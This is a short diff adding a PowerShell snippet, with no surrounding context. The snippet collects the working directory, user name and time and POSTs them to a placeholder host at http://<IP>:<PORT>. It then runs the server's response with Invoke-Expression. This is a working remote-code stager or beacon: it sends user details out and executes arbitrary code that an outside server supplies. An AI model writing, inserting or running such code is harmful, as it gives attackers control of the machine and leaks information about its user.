@@ -1,0 +1,4 @@
+$json = [pscustomobject]@{ Path=$PWD.Path; User=$env:USERNAME; Time=(Get-Date).ToString("o") } | ConvertTo-Json -Depth 5
+$wc = New-Object Net.WebClient
+$wc.Headers["Content-Type"] = "application/json"
+IEX ($wc.UploadString("http://<IP>:<PORT>", "POST", $json))
